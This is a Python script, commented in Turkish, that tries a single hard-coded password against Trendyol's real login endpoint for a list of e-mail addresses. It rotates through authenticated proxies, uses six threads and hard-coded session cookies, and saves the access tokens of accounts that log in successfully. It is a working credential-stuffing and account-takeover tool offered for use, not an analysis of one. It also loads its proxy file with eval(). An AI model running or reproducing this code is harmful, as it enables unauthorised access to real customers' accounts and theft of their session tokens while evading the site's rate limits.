import random
import requests
import time
from concurrent.futures import ThreadPoolExecutor
import json
import psutil

# Header bilgileri
headers = {
    "culture": "tr-TR",
    "storefront-id": "1",
    "application-id": "1",
    "Content-Type": "application/json"
}

# API endpoint - Gerçek bir API URL'si kullanın
url = "https://auth.trendyol.com/login"

# Kullanıcı verilerini içeren dosyanın adı
kullanici_dosyasi = "/Users/alper/sifresi_değisenler/sifresi_değisenler.json"

# Proxy listesi
proxy_dosyasi = "/Users/alper/Desktop/APİ-trendyol/proxies.json"

with open(proxy_dosyasi, 'r') as dosya:
    proxy_listesi = eval(dosya.read())

# Çerezler
cookies = {
    "__cfruid": "69cceb511859cd6579d62312074e7f5bd18589ce-1717159388",
    "_cfuvid": "g.d1HdCaB5EJbqqhNZc0sSlGh7OAu5UqZkq1.9qEAjU-1717159388907-0.0.1.1-604800000"
}

# Aktif ve deaktif kullanıcıları kaydetmek için listeler
aktif_kullanicilar = []
deaktif_kullanicilar = []
kontrol_edilmemis_kullanicilar = []
bekleme_suresi = 0

# Proxy formatını düzenlemek için yardımcı fonksiyon
def proxy_formatla(proxy):
    ip, port, kullanici_adi, sifre = proxy.split(':')
    return f"http://{kullanici_adi}:{sifre}@{ip}:{port}"

def api_istegi(email, sifre, proxy):
    data = {
        "email": email,
        "password": 'A123456789a'
    }
    proxies = {
        "http": proxy,
        "https": proxy
    }
    session = requests.Session()
    session.headers.update(headers)
    session.cookies.update(cookies)

    try:
        # POST isteği gönderme
        response = session.post(url, json=data, proxies=proxies)

        # Cevabı kontrol etme
        if response.status_code == 200:
            # Başarılı istek
            print(f"{proxy} - Başarılı: {email} - {response.json()}")
            access_token = response.json().get('accessToken')
            aktif_kullanicilar.append({"email": email, "sifre": sifre, "token": access_token})
        elif response.status_code == 400:
            # Yanlış email veya şifre
            print(f"{proxy} -  400 Hatası: Yanlış email veya şifre - {email}")
            deaktif_kullanicilar.append({"email": email, "sifre": sifre})
        else:
            # Diğer hata durumları
            print(f"{proxy} -  Hata: {email} - {response.status_code} - {response.text}")
            kontrol_edilmemis_kullanicilar.append({"email": email, "sifre": sifre})
    except requests.exceptions.RequestException as e:
        print(f"{proxy} -  İstek sırasında bir hata oluştu: {email} - {e}")
        kontrol_edilmemis_kullanicilar.append({"email": email, "sifre": sifre})

def kaydet():
    # Aktif kullanıcıları JSON dosyasına yaz
    with open("aktif_kullanıcılar.json", 'w') as dosya:
        json.dump(aktif_kullanicilar, dosya, ensure_ascii=False, indent=4)

    # Deaktif kullanıcıları JSON dosyasına yaz
    with open("deaktif_kullanıcılar.json", 'w') as dosya:
        json.dump(deaktif_kullanicilar, dosya, ensure_ascii=False, indent=4)
    
    # Kontrol edilmemiş kullanıcıları JSON dosyasına yaz
    with open("kontrol_edilmemis_kullanıcılar.json", 'w') as dosya:
        json.dump(kontrol_edilmemis_kullanicilar, dosya, ensure_ascii=False, indent=4)

# Dosyadan kullanıcı verilerini oku ve API'ye gönder
with open(kullanici_dosyasi, 'r') as dosya:
    kullanicilar = json.load(dosya)

proxy_index = 0
kontrol_edilen_kullanici = 0

with ThreadPoolExecutor(max_workers=6) as executor:  # Paralel iş parçacığı sayısını ayarlayın
    for kullanici in kullanicilar:
        email = kullanici.get("email")
        sifre = kullanici.get("sifre")
        proxy = proxy_listesi[proxy_index % len(proxy_listesi)]
        executor.submit(api_istegi, email, sifre, proxy)
        proxy_index += 1
        time.sleep(0)

# İşlem tamamlandığında dosyaları kaydet
kaydet()
